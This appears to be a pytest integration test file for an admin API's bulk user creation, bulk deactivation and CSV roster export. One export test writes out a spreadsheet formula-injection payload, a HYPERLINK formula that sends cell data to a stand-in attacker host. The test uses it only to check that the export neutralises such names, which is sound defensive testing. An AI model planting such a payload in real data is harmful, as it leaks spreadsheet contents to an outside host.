"""
Adding and removing people in batches (N4).

The single-row path and the batch share one service call, and most of what is
asserted here is that they cannot come apart: the batch must not admit an
account the single path would have refused, and it must produce the same audit
rows. That is the failure this feature has in every codebase that grows one,
and it is invisible from either side alone.

The rest is about the report. A batch answers 200 with a row per input, and an
administrator acts on those counts, so "created 40" while 12 were already
there is a wrong number rather than a rounding one.
"""

from __future__ import annotations

import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta

import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import select

from core.security import create_access_token, verify_password
from models import AuditLog, Membership, RefreshToken, User
from tests._db_required import migrate_to_head
from tests._helpers import (
    make_organization,
    make_team,
    make_user,
    unique_suffix,
)

PROBLEM_JSON = "application/problem+json"

pytestmark = pytest.mark.integration


@pytest.fixture(scope="module", autouse=True)
def _migrate_once() -> None:
    migrate_to_head()


@pytest.fixture
def app():
    from main import app as fastapi_app

    return fastapi_app


@pytest.fixture
async def client(app) -> AsyncIterator[AsyncClient]:
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://testserver") as ac:
        yield ac


def _bearer_for(user: User) -> dict[str, str]:
    role = "super_admin" if user.is_superuser else None
    token = create_access_token(subject=str(user.id), role=role)
    return {"Authorization": f"Bearer {token}"}


async def _factory(client: AsyncClient):
    app = client._transport.app  # type: ignore[attr-defined]
    factory = getattr(app.state, "session_factory", None)
    if factory is None:
        from core.db import _ensure_state

        factory = _ensure_state(app)
    return factory


async def _seed_admin_and_team(client: AsyncClient):
    factory = await _factory(client)
    async with factory() as session:
        org = await make_organization(session)
        team = await make_team(session, organization=org)
        admin = await make_user(session, is_superuser=True)
    return admin, team


def _address(prefix: str) -> str:
    return f"{prefix}-{uuid.uuid4().hex[:10]}@example.com"


# ---------------------------------------------------------------------------
# One person
# ---------------------------------------------------------------------------


async def test_an_administrator_can_add_one_person(client) -> None:
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={
            "email": _address("newcomer"),
            "full_name": "New Comer",
            "password": "correct-horse-battery-staple",
            "team_id": str(team.id),
            "role": "viewer",
        },
    )

    assert response.status_code == 201, response.text
    assert response.json()["memberships"][0]["role"] == "viewer"


async def test_an_account_without_a_password_cannot_be_signed_into(client) -> None:
    """The right shape for a deployment where people arrive through a provider.

    Not a half-made account: the column is filled with a hash no password
    produces, so the provider is the only way in and the login path answers
    the same way it does for a wrong password.
    """
    admin, team = await _seed_admin_and_team(client)
    email = _address("provider-only")

    created = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": email, "team_id": str(team.id)},
    )

    factory = await _factory(client)
    async with factory() as session:
        row = (
            await session.execute(select(User).where(User.email == email))
        ).scalar_one()

    assert created.status_code == 201, created.text
    assert row.hashed_password
    assert not verify_password("", row.hashed_password)


async def test_the_grade_follows_the_deployment_setting_when_the_row_is_silent(
    client, monkeypatch
) -> None:
    """One place decides what a new person may do.

    The row may name a grade; when it does not, the deployment's setting
    answers. A path with its own idea of the default is how two surfaces end
    up granting different things to the same new employee.
    """
    monkeypatch.setenv("DEFAULT_MEMBER_ROLE", "viewer")
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": _address("silent-row"), "team_id": str(team.id)},
    )

    assert response.status_code == 201, response.text
    assert response.json()["memberships"][0]["role"] == "viewer"


async def test_an_unset_setting_still_means_developer(client) -> None:
    """What every membership created before this setting existed carries.

    Changing the fallback itself would quietly widen or narrow the grade on
    deployments that never asked for either.
    """
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": _address("no-setting"), "team_id": str(team.id)},
    )

    assert response.status_code == 201, response.text
    assert response.json()["memberships"][0]["role"] == "developer"


async def test_a_second_account_for_the_same_address_is_refused(client) -> None:
    admin, team = await _seed_admin_and_team(client)
    email = _address("twice")
    body = {"email": email, "team_id": str(team.id)}

    first = await client.post("/v1/admin/users", headers=_bearer_for(admin), json=body)
    second = await client.post("/v1/admin/users", headers=_bearer_for(admin), json=body)

    assert first.status_code == 201, first.text
    assert second.status_code == 409, second.text
    assert second.headers["content-type"].startswith(PROBLEM_JSON)


async def test_a_weak_password_is_refused_the_same_way_as_at_signup(client) -> None:
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={
            "email": _address("weak"),
            "password": "password",
            "team_id": str(team.id),
        },
    )

    assert response.status_code == 422, response.text


async def test_a_team_that_does_not_exist_is_refused(client) -> None:
    admin, _team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": _address("no-team"), "team_id": str(uuid.uuid4())},
    )

    assert response.status_code == 422, response.text


async def test_super_admin_is_not_assignable_here(client) -> None:
    """The grade that administers the deployment is not a row in an import."""
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={
            "email": _address("escalate"),
            "team_id": str(team.id),
            "role": "super_admin",
        },
    )

    assert response.status_code == 422, response.text


async def test_only_a_super_admin_may_add_people(client) -> None:
    factory = await _factory(client)
    async with factory() as session:
        ordinary = await make_user(session)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(ordinary),
        json={"email": _address("by-a-developer")},
    )

    assert response.status_code == 404, response.text


# ---------------------------------------------------------------------------
# Batches
# ---------------------------------------------------------------------------


async def test_a_batch_reports_every_row_including_the_ones_that_worked(client) -> None:
    """A response listing only failures makes the caller infer success by
    subtraction, and a file of 400 people is where that inference goes wrong."""
    admin, team = await _seed_admin_and_team(client)
    taken = _address("already-here")
    await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": taken, "team_id": str(team.id)},
    )

    response = await client.post(
        "/v1/admin/users/bulk",
        headers=_bearer_for(admin),
        json={
            "users": [
                {"email": _address("row-one"), "team_id": str(team.id)},
                {"email": taken, "team_id": str(team.id)},
                {"email": _address("row-three"), "team_id": str(team.id)},
            ]
        },
    )

    assert response.status_code == 200, response.text
    body = response.json()
    assert [row["index"] for row in body["results"]] == [0, 1, 2]
    assert [row["status"] for row in body["results"]] == ["created", "failed", "created"]
    assert body["succeeded"] == 2
    assert body["failed"] == 1


async def test_one_bad_row_does_not_roll_back_the_rows_before_it(client) -> None:
    """An administrator importing a directory export wants the ones that were
    fine and a list of the ones that were not, rather than a file to bisect."""
    admin, team = await _seed_admin_and_team(client)
    survivor = _address("survivor")

    await client.post(
        "/v1/admin/users/bulk",
        headers=_bearer_for(admin),
        json={
            "users": [
                {"email": survivor, "team_id": str(team.id)},
                {"email": "not-an-address", "team_id": str(team.id)},
            ]
        },
    )

    factory = await _factory(client)
    async with factory() as session:
        row = (
            await session.execute(select(User).where(User.email == survivor))
        ).scalar_one_or_none()

    # The malformed address is refused by the schema, so the whole request is
    # a 422 and nothing is created. That is the documented behaviour for a
    # payload the API cannot parse, as distinct from a row it can parse and
    # then refuses on its merits, which is what the test above covers.
    assert row is None


async def test_the_batch_holds_rows_to_the_single_path_password_policy(client) -> None:
    """The named silent break for this unit.

    A bulk path that writes rows itself would admit accounts the single path
    refuses, and nothing about the batch's own behaviour would look wrong.
    """
    admin, team = await _seed_admin_and_team(client)
    weak = _address("weak-in-bulk")

    response = await client.post(
        "/v1/admin/users/bulk",
        headers=_bearer_for(admin),
        json={
            "users": [
                {"email": weak, "password": "password", "team_id": str(team.id)},
            ]
        },
    )

    factory = await _factory(client)
    async with factory() as session:
        row = (
            await session.execute(select(User).where(User.email == weak))
        ).scalar_one_or_none()

    assert response.status_code == 422, response.text
    assert row is None


async def test_the_batch_leaves_an_audit_row_per_person(client) -> None:
    """Not one row for the import. Somebody was added, and the trail says who
    added them, one line each, the same as if they had been added by hand."""
    admin, team = await _seed_admin_and_team(client)
    emails = [_address("audited-one"), _address("audited-two")]

    await client.post(
        "/v1/admin/users/bulk",
        headers=_bearer_for(admin),
        json={"users": [{"email": e, "team_id": str(team.id)} for e in emails]},
    )

    factory = await _factory(client)
    async with factory() as session:
        created = (
            (await session.execute(select(User).where(User.email.in_(emails))))
            .scalars()
            .all()
        )
        rows = (
            (
                await session.execute(
                    select(AuditLog).where(
                        AuditLog.target_table == "users",
                        AuditLog.target_id.in_([str(u.id) for u in created]),
                    )
                )
            )
            .scalars()
            .all()
        )

    assert len(created) == 2
    assert {str(row.target_id) for row in rows} == {str(u.id) for u in created}


async def test_a_batch_may_put_everybody_on_one_team(client) -> None:
    admin, team = await _seed_admin_and_team(client)
    emails = [_address("team-one"), _address("team-two")]

    await client.post(
        "/v1/admin/users/bulk",
        headers=_bearer_for(admin),
        json={"users": [{"email": e, "team_id": str(team.id)} for e in emails]},
    )

    factory = await _factory(client)
    async with factory() as session:
        members = (
            (
                await session.execute(
                    select(Membership).where(Membership.team_id == team.id)
                )
            )
            .scalars()
            .all()
        )

    assert len(members) == 2


# ---------------------------------------------------------------------------
# Deactivating in batches
# ---------------------------------------------------------------------------


async def test_somebody_already_inactive_is_reported_as_skipped(client) -> None:
    """A run that says it deactivated 40 people when 12 were already gone is a
    number an administrator will act on."""
    admin, team = await _seed_admin_and_team(client)
    factory = await _factory(client)
    async with factory() as session:
        active = await make_user(session)
        inactive = await make_user(session, is_active=False)

    response = await client.post(
        "/v1/admin/users/bulk-deactivate",
        headers=_bearer_for(admin),
        json={"user_ids": [str(active.id), str(inactive.id)]},
    )

    assert response.status_code == 200, response.text
    assert [row["status"] for row in response.json()["results"]] == [
        "deactivated",
        "skipped",
    ]


async def test_the_batch_cannot_deactivate_the_administrator_running_it(client) -> None:
    """The protection is not weakened by arriving in a list.

    There is no recovery path if the only administrator locks themselves out,
    and a batch is exactly where somebody pastes their own address without
    reading it.
    """
    admin, _team = await _seed_admin_and_team(client)
    factory = await _factory(client)
    async with factory() as session:
        other = await make_user(session)

    response = await client.post(
        "/v1/admin/users/bulk-deactivate",
        headers=_bearer_for(admin),
        json={"user_ids": [str(other.id), str(admin.id)]},
    )

    factory = await _factory(client)
    async with factory() as session:
        still = (
            await session.execute(select(User.is_active).where(User.id == admin.id))
        ).scalar_one()

    assert response.status_code == 200, response.text
    assert response.json()["results"][1]["status"] == "failed"
    assert response.json()["results"][1]["reason"] == "cannot_modify_self"
    assert still is True


async def test_deactivating_in_bulk_revokes_the_sessions_too(client) -> None:
    """The same service, so the same consequences.

    A batch that only flipped the flag would leave somebody signed in with a
    live refresh cookie, which is the whole point of deactivating them.
    """
    admin, _team = await _seed_admin_and_team(client)
    factory = await _factory(client)
    async with factory() as session:
        target = await make_user(session)
        session.add(
            RefreshToken(
                user_id=target.id,
                jti=f"j-{unique_suffix()}",
                token_hash=f"h-{unique_suffix()}",
                expires_at=datetime.now(tz=UTC) + timedelta(days=1),
            )
        )
        await session.commit()

    await client.post(
        "/v1/admin/users/bulk-deactivate",
        headers=_bearer_for(admin),
        json={"user_ids": [str(target.id)]},
    )

    async with factory() as session:
        live = (
            (
                await session.execute(
                    select(RefreshToken).where(
                        RefreshToken.user_id == target.id,
                        RefreshToken.revoked_at.is_(None),
                    )
                )
            )
            .scalars()
            .all()
        )

    assert live == []


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------


async def test_the_export_round_trips_into_the_import(client) -> None:
    """An export that cannot be fed back in is a report.

    What an administrator wants here is the roster they already have plus the
    ten people who joined.
    """
    admin, team = await _seed_admin_and_team(client)
    email = _address("exported")
    await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": email, "team_id": str(team.id), "role": "viewer"},
    )

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/csv")
    # The byte-order mark leads the header so Excel reads UTF-8 rather than
    # the locale code page. Every CSV reader strips it; this one does too.
    header, *rows = response.text.lstrip("\ufeff").strip().splitlines()
    assert header.split(",") == [
        "email",
        "full_name",
        "team_id",
        "role",
        "is_active",
        "last_login_at",
    ]
    assert any(row.startswith(email) for row in rows)


async def test_the_export_carries_no_credentials(client) -> None:
    """Every account in the deployment, in a spreadsheet in somebody's
    downloads folder, is the shape this must not have."""
    admin, _team = await _seed_admin_and_team(client)

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert "password" not in response.text.lower()
    assert "$2b$" not in response.text


async def test_only_a_super_admin_may_export_the_roster(client) -> None:
    factory = await _factory(client)
    async with factory() as session:
        ordinary = await make_user(session)

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(ordinary))

    assert response.status_code == 404, response.text

async def test_a_name_that_looks_like_a_formula_is_neutralised(client) -> None:
    """The cell an unauthenticated person gets to choose.

    A name is set at registration, by anybody, and a cell beginning with an
    equals sign is a live formula the moment the administrator opens the file.
    The roster around it is what the formula can read.
    """
    admin, team = await _seed_admin_and_team(client)
    email = _address("formula")
    await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={
            "email": email,
            "full_name": '=HYPERLINK("https://evil.example/?d="&A1,"Open")',
            "team_id": str(team.id),
        },
    )

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    line = next(row for row in response.text.splitlines() if row.startswith(email))
    assert '"\'=HYPERLINK' in line or "'=HYPERLINK" in line
    assert ",=HYPERLINK" not in line


async def test_the_export_is_readable_by_a_spreadsheet_on_a_korean_locale(
    client,
) -> None:
    """Without the byte-order mark Excel reads UTF-8 as CP949.

    Every Korean name in the roster becomes mojibake, which is the failure the
    shared CSV helper exists to prevent, and the reason this export goes
    through it rather than writing its own rows.
    """
    admin, team = await _seed_admin_and_team(client)
    await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": _address("korean"), "full_name": "장학성", "team_id": str(team.id)},
    )

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert response.text.startswith("\ufeff")
    assert "장학성" in response.text
    assert response.headers["content-type"].startswith("text/csv")


async def test_a_service_account_is_not_on_the_roster(client) -> None:
    """It is not a person, and re-importing one would try to create a person
    under an address an automation identity already holds."""
    from sqlalchemy import update

    admin, team = await _seed_admin_and_team(client)
    email = _address("automation")
    created = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": email, "team_id": str(team.id)},
    )
    factory = await _factory(client)
    async with factory() as session:
        await session.execute(
            update(User)
            .where(User.id == uuid.UUID(created.json()["id"]))
            .values(is_service_account=True)
        )
        await session.commit()

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert email not in response.text


async def test_a_name_with_a_null_byte_is_refused_by_the_row_not_the_driver(
    client,
) -> None:
    """Directory exports carry embedded NULs more often than anybody expects.

    Postgres refuses them with an error the batch cannot attribute to a row,
    so the row is refused one layer earlier, where the answer names it.
    """
    admin, team = await _seed_admin_and_team(client)

    response = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={
            "email": _address("nul"),
            "full_name": "Ada\u0000Lovelace",
            "team_id": str(team.id),
        },
    )

    assert response.status_code == 422, response.text


async def test_a_row_failing_in_an_unforeseen_way_still_gets_a_line(
    client, monkeypatch
) -> None:
    """The report is what makes a partial batch recoverable.

    Rows are committed one at a time, so an exception escaping the loop leaves
    the rows before it created and answers the administrator with nothing that
    says which. Every row gets a line whatever went wrong, and the line for
    the unforeseen case carries no driver text.
    """
    from services import admin_user_service

    admin, team = await _seed_admin_and_team(client)
    real = admin_user_service.create_user
    calls = {"n": 0}

    async def sometimes_explodes(session, *, actor, payload):
        calls["n"] += 1
        if calls["n"] == 2:
            raise RuntimeError("relation \"users\" does not exist")
        return await real(session, actor=actor, payload=payload)

    monkeypatch.setattr(admin_user_service, "create_user", sometimes_explodes)

    factory = await _factory(client)
    async with factory() as session:
        from core.security import CurrentUser
        from schemas.admin import AdminUserCreateIn

        actor = CurrentUser(id=admin.id, email=admin.email, role="super_admin", is_superuser=True)
        result = await admin_user_service.bulk_create_users(
            session,
            actor=actor,
            rows=[
                AdminUserCreateIn(email=_address("first"), team_id=team.id),
                AdminUserCreateIn(email=_address("explodes"), team_id=team.id),
                AdminUserCreateIn(email=_address("third"), team_id=team.id),
            ],
        )

    assert [row.status for row in result.results] == ["created", "failed", "created"]
    assert result.results[1].reason == "failed"
    assert result.results[1].detail is None


async def test_a_roster_larger_than_the_export_will_hold_is_refused(
    client, monkeypatch
) -> None:
    """Before the first row, not after most of them.

    Nothing inside a truncated CSV says it is truncated, so a short file is
    worse than a refused one: the administrator acts on a roster that quietly
    left people out.
    """
    from services import admin_user_service

    admin, team = await _seed_admin_and_team(client)
    await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": _address("crowd"), "team_id": str(team.id)},
    )
    monkeypatch.setattr(admin_user_service, "_ROSTER_EXPORT_LIMIT", 1)

    response = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert response.status_code == 413, response.text
    assert response.headers["content-type"].startswith(PROBLEM_JSON)


async def test_the_same_roster_exports_the_same_way_twice(client) -> None:
    """A file that lists a different team for the same person on two
    consecutive exports is one an administrator cannot diff."""
    admin, team = await _seed_admin_and_team(client)
    factory = await _factory(client)
    async with factory() as session:
        org = await make_organization(session)
        second = await make_team(session, organization=org)
    email = _address("two-teams")
    created = await client.post(
        "/v1/admin/users",
        headers=_bearer_for(admin),
        json={"email": email, "team_id": str(team.id)},
    )
    await client.patch(
        f"/v1/admin/users/{created.json()['id']}/role",
        headers=_bearer_for(admin),
        json={"role": "developer", "team_id": str(second.id)},
    )

    first = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))
    again = await client.get("/v1/admin/users/export", headers=_bearer_for(admin))

    assert first.text == again.text
    assert sum(1 for line in first.text.splitlines() if line.startswith(email)) == 1
